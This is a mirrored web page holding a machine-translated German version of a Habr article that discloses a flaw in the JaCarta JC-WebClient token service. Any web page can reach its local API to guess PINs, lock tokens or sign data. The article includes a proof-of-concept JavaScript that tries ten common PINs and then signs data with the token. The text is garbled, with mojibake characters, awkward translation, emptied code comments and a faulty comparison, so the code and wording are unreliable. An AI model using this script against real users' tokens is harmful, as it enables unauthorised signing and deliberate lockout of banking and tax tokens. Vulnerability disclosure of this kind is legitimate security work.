<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>‚è∏Ô∏è üê≤ üõí Testen Sie JaCarta WebClient oder bewahren Sie Token in einem Safe auf üé¶ üçô üë®üèæ‚Äç‚öñÔ∏è</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content=""Als die schwarze Decke f√ºr einen Moment weggeblasen wurde, drehte sich Margarita um und sah, dass es nicht nur mehrfarbige T√ºrme mit einem Flugzeug √º...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Testen Sie JaCarta WebClient oder bewahren Sie Token in einem Safe auf</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/439790/"> <i>"Als die schwarze Decke f√ºr einen Moment weggeblasen wurde, drehte sich Margarita um und sah, dass es nicht nur mehrfarbige T√ºrme mit einem Flugzeug √ºber ihnen gab, sondern auch keine Stadt selbst, die in den Boden gegangen war und nur Nebel hinterlassen hatte."</i> <i><br><br></i>  <i>M.A.</i>  <i>Bulgakow</i> <i><br></i>  <i>"Der Meister und Margarita"</i> <br><br>  Hallo Habr!  Wahrscheinlich hat fast jede russische Organisation diese Produkte in einer fr√∂hlichen mehrfarbigen Farbe.  Wir sprechen √ºber JaCarta-Produkte und -Software f√ºr sie.  Dieses Gl√ºck fiel auch mir zu und ich beschloss, die schwarze Abdeckung, die ihre Essenz oder API verbirgt, leicht zu erweitern.  Einige Banken, insbesondere die Ausgabe von JaCarta GOST-2-Token an ihre Kunden, ben√∂tigen die Installation der JC-WebClient-Anwendung von Aladdin R.D. <br><br>  Obwohl es auf der offiziellen Website des Entwicklers keine neue Distribution gibt (im Demo-Bereich k√∂nnen Sie eine √§ltere Version herunterladen, aber die veraltete API verwendet), kann die Distribution √ºber Google in der Zeile "JC-WebClient-4.0.0.1186" auf den Websites des RB gefunden werden. <br><br>  Nach der Installation der Anwendung auf dem Computer des Benutzers wird Port 24738 ge√∂ffnet, auf dem dieser Client arbeitet. <br><br> <code>https://localhost:24738/JCWebClient.js</code> <br> <br>  Die Entwickler-Website beschreibt offen und detailliert die API dieser Anwendung (sowie die Funktionen der Arbeit mit dem Dateisystem der gesamten Token-Zeile dieses Herstellers √ºber jcFS.dll, das Teil des Installationspakets ‚ÄûJaCarta Single Client‚Äú ist). Unter dem Strich k√∂nnen Sie eine Reihe von Funktionen verwenden Signieren Sie die digitale Signatur des Tokens mit irgendetwas, holen Sie sich einen PIN-Code oder blockieren Sie das Token mit erfolglosen Versuchen, es einzugeben.  Und das alles aus der Ferne √ºber das Internet. <br><a name="habracut"></a><br>  Es ist kein Geheimnis, dass Benutzer h√§ufig den Standard-PIN-Code f√ºr das Token oder den, mit dem sie ihn erhalten haben, belassen (sie bef√ºrchten normalerweise, dass beim √Ñndern des PIN-Codes alles nicht mehr funktioniert). <br><br>  Am h√§ufigsten werden PIN-Codes vom Typ 123456 verwendet, und das Token wird w√§hrend des Arbeitstages oder sogar rund um die Uhr in den Computeranschluss oder den USB-Hub eingef√ºgt. <br><br>  Dank JC-WebClient k√∂nnen Sie, wenn Sie einem solchen Benutzer eine Webseite oder eine E-Mail mit einfachem JavaScript √ºbermitteln, die Token-Schl√ºssel zwar nicht erhalten (in einigen F√§llen ist dies nur durch direkten Zugriff auf das Token-Dateisystem m√∂glich, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">ein Beispiel wurde bereits angegeben</a> ), aber versuchen Sie es Nehmen Sie einen PIN-Code und signieren Sie alle Daten und senden Sie sie irgendwohin. <br><br>  Bei 10 erfolglosen Iterationsversuchen wird das Token blockiert. Wenn der Administratorcode zum Entsperren nicht festgelegt ist, hilft nur die Initialisierung.  Und dies wird nicht auf Zeitsteuern gezahlt (und aufgrund von Zinsen und sogar der Sperrung des Steuerkontos der Organisation der Steuer), Verluste von Lieferanten, im Allgemeinen ist gut nicht genug. <br><br><img src="https://habrastorage.org/webt/vr/wy/qe/vrwyqehr02krqg9muflt0rndgqa.jpeg"><br><br>  Das Problem mit der Aufz√§hlung des PIN-Codes k√∂nnte entweder dadurch gel√∂st werden, dass er nur √ºber das JC-WebClient-Schnittstellenfenster eingegeben werden kann, oder als halbe Ma√ünahme, beispielsweise bei drei erfolglosen Versuchen, ihn einzugeben, die weitere Autorisierung blockieren, indem dem Benutzer eine Nachricht angezeigt wird, und warten, bis er es tut wird Ihre Aktionen best√§tigen. <br><br>  Ich habe ein kleines Testskript geschrieben, das diese Sicherheitsanf√§lligkeit zeigt.  Das Skript funktioniert in allen modernen und relativ modernen Browsern, auch im Internet Explorer :) <br><br>  Nat√ºrlich sendet es nirgendwo etwas, sondern zeigt einfach die Ergebnisse einer Folge von Funktionen an. <br><br>  Das Skript implementiert eine vollst√§ndige Aufz√§hlung von 10 Versuchen, den PIN-Code "zum T√∂ten" des Tokens einzugeben, sodass Sie das Skript nur mit einem Test-Token ausf√ºhren k√∂nnen! <br><br>  Es sollte auch beachtet werden, dass die Verwendung dieses Skripts au√üer auf seinem eigenen Test-Token einen Versto√ü gegen das Gesetz darstellt. <br><br>  Testergebnis: <br><br><img src="https://habrastorage.org/webt/et/g1/ma/etg1ma5gplp9lsyedbytdzxtcx8.jpeg"><br>  Das Skript generiert mit JC-WebClient zum Testen ein Schl√ºsselpaar und ein Zertifikat. <br>  Sie k√∂nnen EToken PRO Java 72 K, JaCarta GOST und JaCarta GOST-2 verwenden.  Das Token muss mit der Benutzer-PIN 111111 vorinitialisiert werden. <br><br>  Bevor Sie mit dem Testen beginnen, m√ºssen Sie JC-WebClient Version 4 oder h√∂her installieren. <br><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">// JCWebClient2 JCWebClient2.initialize(); document.write("JC-WebClient   "+" "); //  JCWebClient2 var vers=JCWebClient2.getJCWebClientVersion(); document.write(" JCWebClient2 " + vers +" "); //         var slots = JCWebClient2.getAllSlots(); document.write(" : "+slots.length+" "); //   for (i = 0; i &lt; slots.length; i++) { var slot = slots[i]; document.write(": "+slot.device.name+" "+slot.device.model+" "); } var tokenID = slot.id, //   userPin = '111111'; // PIN-  //       // (  JCWebClient2.Vars.AuthState.notBinded) var tokenState = JCWebClient2.getLoggedInState(); document.write('1) Token is binded: ' + (tokenState.state == JCWebClient2.Vars.AuthState.binded)+" "); //  PIN- JCWebClient2.bindToken({ args: { tokenID: tokenID, pin: userPin } }); //    // (  JCWebClient2.Vars.AuthState.binded) tokenState = JCWebClient2.getLoggedInState(); document.write('2) Token is binded: ' + (tokenState.state == JCWebClient2.Vars.AuthState.binded)+" "); //          var keyPairID = JCWebClient2.createKeyPair({ args: { paramSet: "XA", description: "my description", algorithm: JCWebClient2.Vars.KeyAlgorithm.GOST_2012_256 } }); //     (Distinguished Name (DN)), //    (Common Name, (CN)) var dn = { 'CN': '123', 'C': 'RU' }; //  ,      var exts = { 'keyUsage': 'Digital Signature' }; //   var contID = JCWebClient2.generateUserSelfSignedCertificate({ args: { keyPairID: keyPairID, dn: dn, exts: exts, days: 365 } }); //    var list=[]; //   list = JCWebClient2.getContainerList({ args: { tokenID: tokenID } }); // id      var data = list[0]; var contID = data.id; document.write("ID : "+data.id+" "); document.write(" : "+data.description+" "); document.write(" : "+data.algorithm+" "); //   PIN- JCWebClient2.unbindToken();</span></span></code> </pre> <br>  Und eigentlich das Sicherheits√ºberpr√ºfungsskript selbst: <br><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">// JCWebClient2 JCWebClient2.initialize(); document.write("JC-WebClient   "+" "); //  JCWebClient2 var vers=JCWebClient2.getJCWebClientVersion(); document.write(" JCWebClient2 " + vers +" "); //         var slots = JCWebClient2.getAllSlots(); document.write(" : "+slots.length+" "); //   for (i = 0; i &lt; slots.length; i++) { var slot = slots[i]; document.write(": "+slot.device.name+" "+slot.device.model+" "); } //   var tokenID = slot.id; //       // (  JCWebClient2.Vars.AuthState.notBinded) var tokenState = JCWebClient2.getLoggedInState(); document.write('Token is binded: ' + (tokenState.state == JCWebClient2.Vars.AuthState.binded)+" "); //    var list=[]; //   list = JCWebClient2.getContainerList({ args: { tokenID: tokenID } }); // id     var data = list[0]; var contID = data.id; document.write("ID : "+data.id+" "); document.write(" : "+data.description+" "); document.write(" : "+data.algorithm+" "); //    (Hello World  Base64) var dataToSign = 'SGVsbG8sIFdvcmxkIQ=='; document.write("  : "+dataToSign+" "); //   var pin=["1234567890", "123456", "1234567", "12345678", "123456789", "0987654321", "111111", "qwerty", "012345", "0123456", "01234567"]; //  function bind(pass) { JCWebClient2.bindToken({ args: { tokenID: tokenID, pin: pass } }); } var i=0; //     //!  10    !!!!!!!!!! while (i &lt; 10) { i++; try{ bind(pin[i]); tokenState = JCWebClient2.getLoggedInState(); //  ,      if(tokenState.state=1) { document.write("   : "+pin[i]+" "); break; } } //    catch(e){document.write(e+" ");} } //    // (  JCWebClient2.Vars.AuthState.binded) tokenState = JCWebClient2.getLoggedInState(); document.write('Token is binded: ' + (tokenState.state == JCWebClient2.Vars.AuthState.binded)+" "); //   var CertificateBody=JCWebClient2.getCertificateBody({ args: { id: contID } }); document.write("CertificateBody: "+CertificateBody+" "); //  ,        Base64 var signedData = JCWebClient2.signBase64EncodedData({ args: { contID: contID, data: dataToSign, attachedSignature: true } }); document.write(" . "); document.write(" : "+signedData+" "); //  var signature = signedData; var res = JCWebClient2.verifyBase64EncodedData({ args: { signature: signature } }); document.write("  : "+res+" "); //   PIN- JCWebClient2.unbindToken();</span></span></code> </pre> <br>  ‚Üí <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Informationsquelle der JC-WebClient-API</a> </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de439790/">https://habr.com/ru/post/de439790/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de439780/index.html">PHP Digest Nr. 149 (28. Januar - 11. Februar 2019)</a></li>
<li><a href="../de439782/index.html">Headless CMS - die Zukunft im Content Management</a></li>
<li><a href="../de439784/index.html">Raptor Methan Motor bricht RD-180 Rekord</a></li>
<li><a href="../de439786/index.html">√úbersicht √ºber das IP-Telefon Snom D712 (und ein wenig D710)</a></li>
<li><a href="../de439788/index.html">Eine weitere Kuriosit√§t bei den Algorithmen GOST Grasshopper und Stribog</a></li>
<li><a href="../de439792/index.html">Die NASA sucht nach Partnern in der amerikanischen Industrie, um eine teilweise wiederverwendbare bemannte Landung zu schaffen</a></li>
<li><a href="../de439794/index.html">R√ºckenschmerzen - Verst√§ndnis aus Sicht der modernen Medizin</a></li>
<li><a href="../de439796/index.html">Spring Boot 2: Was sie nicht in Versionshinweisen schreiben</a></li>
<li><a href="../de439804/index.html">Zen des Unit Testing</a></li>
<li><a href="../de439806/index.html">G√ºltige SSL-Dom√§nennamen f√ºr lokale Docker-Container</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>